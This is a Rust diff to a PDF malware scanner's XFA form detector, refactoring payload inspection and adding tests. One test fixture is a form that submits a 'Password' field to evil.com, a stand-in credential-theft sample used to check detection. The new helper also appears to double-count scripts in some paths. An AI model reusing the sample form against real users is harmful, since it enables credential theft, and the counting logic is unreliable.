@@ -5,10 +5,57 @@ use roxmltree::Document;
 use sis_pdf_core::detect::{Cost, Detector, Needs};
 use sis_pdf_core::evidence::EvidenceBuilder;
 use sis_pdf_core::model::{AttackSurface, Confidence, Finding, Severity};
+use sis_pdf_core::scan::ScanContext;
 use sis_pdf_core::timeout::TimeoutChecker;
 use sis_pdf_pdf::xfa::extract_xfa_script_payloads;
 
 use crate::{entry_dict, xfa_payloads_from_obj};
+
+#[derive(Debug, Clone)]
+pub struct XfaFormRecord {
+    pub object_ref: String,
+    pub ref_chain: String,
+    pub payload_index: usize,
+    pub size_bytes: usize,
+    pub script_count: usize,
+    pub submit_urls: Vec<String>,
+    pub sensitive_fields: Vec<String>,
+    pub script_preview: Option<String>,
+    pub has_doctype: bool,
+}
+
+pub fn collect_xfa_forms(ctx: &ScanContext) -> Vec<XfaFormRecord> {
+    let mut records = Vec::new();
+    let timeout = TimeoutChecker::new(std::time::Duration::from_millis(100));
+    for entry in &ctx.graph.objects {
+        if timeout.check().is_err() {
+            break;
+        }
+        let Some(dict) = entry_dict(entry) else {
+            continue;
+        };
+        let Some((_, xfa_obj)) = dict.get_first(b"/XFA") else {
+            continue;
+        };
+        let payloads = xfa_payloads_from_obj(ctx, xfa_obj);
+        for (idx, payload) in payloads.iter().enumerate() {
+            let stats = inspect_xfa_payload(&payload.bytes);
+            let record = XfaFormRecord {
+                object_ref: format!("{} {} obj", entry.obj, entry.gen),
+                ref_chain: payload.ref_chain.clone(),
+                payload_index: idx,
+                size_bytes: payload.bytes.len(),
+                script_count: stats.script_count,
+                submit_urls: stats.submit_urls,
+                sensitive_fields: stats.sensitive_fields,
+                script_preview: stats.script_preview,
+                has_doctype: stats.has_doctype,
+            };
+            records.push(record);
+        }
+    }
+    records
+}
 
 pub struct XfaFormDetector;
 
@@ -49,12 +96,19 @@ impl Detector for XfaFormDetector {
 
             let payloads = xfa_payloads_from_obj(ctx, xfa_obj);
             for payload in &payloads {
-                let decoded = String::from_utf8_lossy(&payload.bytes);
-                let xml = decoded.as_ref();
-                let lower = decoded.to_ascii_lowercase();
+                let stats = inspect_xfa_payload(&payload.bytes);
 
                 if payload.bytes.len() > XFA_MAX_BYTES {
-                    let meta = base_xfa_meta(payload.bytes.len(), 0, &[], &[], None);
+                    let meta = base_xfa_meta(
+                        &format!("{} {} obj", entry.obj, entry.gen),
+                        &payload.ref_chain,
+                        payload.bytes.len(),
+                        0,
+                        &[],
+                        &[],
+                        None,
+                        stats.has_doctype,
+                    );
                     findings.push(Finding {
                         id: String::new(),
                         surface: self.surface(),
@@ -73,66 +127,27 @@ impl Detector for XfaFormDetector {
                     });
                 }
 
-                if has_doctype(&lower) {
+                if stats.has_doctype {
                     continue;
                 }
 
-                let mut script_count = 0usize;
-                let mut submit_urls = HashSet::new();
-                let mut sensitive_fields = HashSet::new();
-                let mut script_preview = None;
-                let mut parsed = false;
-
-                if let Ok(doc) = Document::parse(xml) {
-                    parsed = true;
-                    gather_xfa_doc_info(
-                        &doc,
-                        &mut script_count,
-                        &mut submit_urls,
-                        &mut sensitive_fields,
-                        &mut script_preview,
-                    );
-                }
-
-                if !parsed || script_count == 0 {
-                    script_count += extract_xfa_script_payloads(&payload.bytes).len();
-                    script_count += count_execute_tags(&lower, XFA_EXECUTE_TAG_LIMIT);
-                }
-
-                if script_preview.is_none() {
-                    if let Some(script) = extract_xfa_script_payloads(&payload.bytes).first() {
-                        let preview = String::from_utf8_lossy(script);
-                        script_preview = Some(preview_text(&preview, XFA_SCRIPT_PREVIEW_LEN));
-                    }
-                }
-
-                if submit_urls.is_empty() {
-                    for url in find_submit_urls(&lower, XFA_SUBMIT_URL_LIMIT) {
-                        insert_limited(&mut submit_urls, url, XFA_SUBMIT_URL_LIMIT);
-                    }
-                }
-
-                if sensitive_fields.is_empty() {
-                    for name in find_field_names(&lower, XFA_FIELD_NAME_LIMIT) {
-                        if is_sensitive_field(&name) {
-                            insert_limited(&mut sensitive_fields, name, XFA_FIELD_NAME_LIMIT);
-                        }
-                    }
-                }
-
-                let submit_list = sorted_strings(&submit_urls);
-                let field_list = sorted_strings(&sensitive_fields);
+                let submit_list = &stats.submit_urls;
+                let field_list = &stats.sensitive_fields;
                 let base_meta = base_xfa_meta(
+                    &format!("{} {} obj", entry.obj, entry.gen),
+                    &payload.ref_chain,
                     payload.bytes.len(),
-                    script_count,
-                    &submit_list,
-                    &field_list,
-                    script_preview.as_deref(),
+                    stats.script_count,
+                    submit_list,
+                    field_list,
+                    stats.script_preview.as_deref(),
+                    stats.has_doctype,
                 );
 
                 for url in submit_list.iter().take(XFA_SUBMIT_URL_LIMIT) {
                     let mut meta = base_meta.clone();
                     meta.insert("xfa.submit.url".into(), url.clone());
+                    meta.insert("url".into(), url.clone());
                     findings.push(Finding {
                         id: String::new(),
                         surface: self.surface(),
@@ -154,6 +169,7 @@ impl Detector for XfaFormDetector {
                 for name in field_list.iter().take(XFA_FIELD_NAME_LIMIT) {
                     let mut meta = base_meta.clone();
                     meta.insert("xfa.field.name".into(), name.clone());
+                    meta.insert("field".into(), name.clone());
                     findings.push(Finding {
                         id: String::new(),
                         surface: self.surface(),
@@ -172,7 +188,7 @@ impl Detector for XfaFormDetector {
                     });
                 }
 
-                if script_count > XFA_SCRIPT_COUNT_HIGH {
+                if stats.script_count > XFA_SCRIPT_COUNT_HIGH {
                     let meta = base_meta.clone();
                     findings.push(Finding {
                         id: String::new(),
@@ -256,6 +272,77 @@ fn count_execute_tags(input: &str, limit: usize) -> usize {
         count += find_tag_blocks(input, "xfa:execute", limit - count).len();
     }
     count
+}
+
+struct XfaPayloadStats {
+    script_count: usize,
+    submit_urls: Vec<String>,
+    sensitive_fields: Vec<String>,
+    script_preview: Option<String>,
+    has_doctype: bool,
+}
+
+fn inspect_xfa_payload(payload: &[u8]) -> XfaPayloadStats {
+    let decoded = String::from_utf8_lossy(payload);
+    let lower = decoded.to_ascii_lowercase();
+    let has_doctype = has_doctype(&lower);
+    let mut script_count = 0usize;
+    let mut submit_urls = HashSet::new();
+    let mut sensitive_fields = HashSet::new();
+    let mut script_preview = None;
+
+    if !has_doctype {
+        if let Ok(doc) = Document::parse(&decoded) {
+            gather_xfa_doc_info(
+                &doc,
+                &mut script_count,
+                &mut submit_urls,
+                &mut sensitive_fields,
+                &mut script_preview,
+            );
+        }
+
+        if script_count == 0 {
+            script_count += extract_xfa_script_payloads(payload).len();
+            script_count += count_execute_tags(&lower, XFA_EXECUTE_TAG_LIMIT);
+        }
+    } else {
+        // Do not attempt further analysis when DOCTYPE is present.
+    }
+
+    if script_preview.is_none() {
+        script_count += extract_xfa_script_payloads(payload).len();
+        script_count += count_execute_tags(&lower, XFA_EXECUTE_TAG_LIMIT);
+    }
+
+    if script_preview.is_none() && !has_doctype {
+        if let Some(script) = extract_xfa_script_payloads(payload).first() {
+            let preview = String::from_utf8_lossy(script);
+            let preview = preview_text(&preview, XFA_SCRIPT_PREVIEW_LEN);
+            if !preview.is_empty() {
+                script_preview = Some(preview);
+            }
+        }
+    }
+
+    if !has_doctype {
+        for url in find_submit_urls(&lower, XFA_SUBMIT_URL_LIMIT) {
+            insert_limited(&mut submit_urls, url, XFA_SUBMIT_URL_LIMIT);
+        }
+        for name in find_field_names(&lower, XFA_FIELD_NAME_LIMIT) {
+            if is_sensitive_field(&name) {
+                insert_limited(&mut sensitive_fields, name, XFA_FIELD_NAME_LIMIT);
+            }
+        }
+    }
+
+    XfaPayloadStats {
+        script_count,
+        submit_urls: sorted_strings(&submit_urls),
+        sensitive_fields: sorted_strings(&sensitive_fields),
+        script_preview,
+        has_doctype,
+    }
 }
 
 fn extract_attr_value(tag: &str, attr: &str) -> Option<String> {
@@ -352,11 +439,14 @@ fn sorted_strings(set: &HashSet<String>) -> Vec<String> {
 }
 
 fn base_xfa_meta(
+    object_ref: &str,
+    ref_chain: &str,
     size: usize,
     script_count: usize,
     submit_urls: &[String],
     sensitive_fields: &[String],
     script_preview: Option<&str>,
+    has_doctype: bool,
 ) -> HashMap<String, String> {
     let mut meta = HashMap::new();
     meta.insert("xfa.size_bytes".into(), size.to_string());
@@ -373,6 +463,9 @@ fn base_xfa_meta(
     if let Some(preview) = script_preview {
         meta.insert("xfa.script.preview".into(), preview.to_string());
     }
+    meta.insert("xfa.object".into(), object_ref.to_string());
+    meta.insert("xfa.ref_chain".into(), ref_chain.to_string());
+    meta.insert("xfa.has_doctype".into(), has_doctype.to_string());
     meta
 }
 
@@ -390,5 +483,53 @@ fn preview_text(text: &str, max_len: usize) -> String {
         normalized
     } else {
         format!("{}...", &normalized[..max_len])
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_parse_simple_xfa() {
+        let payload = br#"<?xml version="1.0"?>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template xmlns="http://www.xfa.org/schema/xfa-template/2.5/">
+    <subform></subform>
+  </template>
+</xdp:xdp>"#;
+
+        let stats = inspect_xfa_payload(payload);
+        assert_eq!(stats.script_count, 0);
+        assert!(stats.submit_urls.is_empty());
+        assert!(stats.sensitive_fields.is_empty());
+        assert!(!stats.has_doctype);
+        assert!(stats.script_preview.is_none());
+    }
+
+    #[test]
+    fn test_detect_xfa_script_submit_and_sensitive_field() {
+        let payload = br#"<?xml version="1.0"?>
+<xfa:form xmlns:xfa="http://ns.adobe.com/xdp/">
+  <script>app.alert('hi');</script>
+  <submit target="https://evil.com/submit"/>
+  <field name="Password"/>
+</xfa:form>"#;
+
+        let stats = inspect_xfa_payload(payload);
+        assert!(stats.script_count >= 1);
+        assert_eq!(
+            stats.submit_urls,
+            vec!["https://evil.com/submit".to_string()]
+        );
+        assert!(stats
+            .sensitive_fields
+            .iter()
+            .any(|value| value.eq_ignore_ascii_case("Password")));
+        assert!(stats
+            .script_preview
+            .as_deref()
+            .map(|value| value.contains("alert"))
+            .unwrap_or(false));
     }
 }
